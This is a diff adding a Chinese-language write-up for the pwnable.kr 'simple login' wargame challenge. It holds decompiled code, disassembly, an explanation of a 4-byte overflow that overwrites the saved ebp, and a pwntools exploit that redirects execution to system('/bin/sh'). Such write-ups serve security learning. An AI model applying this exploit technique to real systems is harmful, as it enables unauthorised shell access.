@@ -324,3 +324,73 @@ payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00) 
 p.sendline(b64e(payload) + '/bin/sh\0')
 p.interactive()
 ```
+
+### [simple login]
+
+> Can you get authentication from this server?
+>
+> Download : http://pwnable.kr/bin/login
+>
+> Running at : nc pwnable.kr 9003
+
+`login` 为 32 位 ELF 程序，简单使用 IDA 分析程序，可以得到主要程序逻辑：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v3; // ST04_1@1
+  int v5; // [sp+18h] [bp-28h]@1
+  __int16 v6; // [sp+1Eh] [bp-22h]@1
+  unsigned int v7; // [sp+3Ch] [bp-4h]@1
+
+  memset(&v6, 0, 0x1Eu);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  printf("Authenticate : ", v3);
+  _isoc99_scanf("%30s", (unsigned int)&v6);
+  memset(&input, 0, 0xCu);
+  v5 = 0;
+  v7 = Base64Decode(&v6, &v5);
+  if ( v7 > 0xC )
+  {
+    puts("Wrong Length");
+  }
+  else
+  {
+    memcpy(&input, v5, v7);
+    if ( auth(v7) == 1 )
+      correct();
+  }
+  return 0;
+}
+```
+
+这里经过 `Base64Decode()` 函数解码后字符串长度不能超过 12bytes，而在 `auth()` 函数中通过 `memcpy()` 函数将解码后的字符串复制到自己的函数堆栈中：
+
+    .text:080492A2                 mov     eax, [ebp+arg_0]
+    .text:080492A5                 mov     [esp+8], eax    ; i_buf_length (max=0xc)
+    .text:080492A9                 mov     dword ptr [esp+4], offset input ; base64 decode string
+    .text:080492B1                 lea     eax, [ebp+var_14]
+    .text:080492B4                 add     eax, 0Ch        ; [ebp-0x8] buff[8]
+    .text:080492B7                 mov     [esp], eax
+    .text:080492BA                 call    memcpy          ; memcpy(&(ebp-0x8), &b64d_str, 0xc)
+    
+这里可以看到 `auth()` 函数中只使用了 8bytes 来存储 Base64 解码后的字符串，而允许的解码后的字符串长度为 12bytes，溢出的 4bytes 刚好覆盖了 `ebp` 的值，在 `auth()` 函数返回执行 `leave; ret` 从而可以控制程序流程，因为输入字符串和解码后的字符串都存在了 `.bss 0x0811EB40` 地址上，所以直接覆盖 `ebp` 值为 `input` 变量的地址，并在 `0x0811EB40 + 4` 处写入需要 RET 的地址即可。
+
+程序中已经准备好了 `system("/bin/sh")`，所以直接将返回地址控制到该处即可，最终 exp 如下：
+
+```python
+#!/usr/bin/env python
+# coding: utf-8
+
+from pwn import *
+
+p = process('./login')
+
+ebp_over = 0x0811EB40  # input .bss
+pp_system = 0x08049284 # system("/bin/sh")
+payload = b64e('A' * 4 + p32(pp_system) + p32(ebp_over))
+
+p.sendline(payload)
+p.interactive()
+```
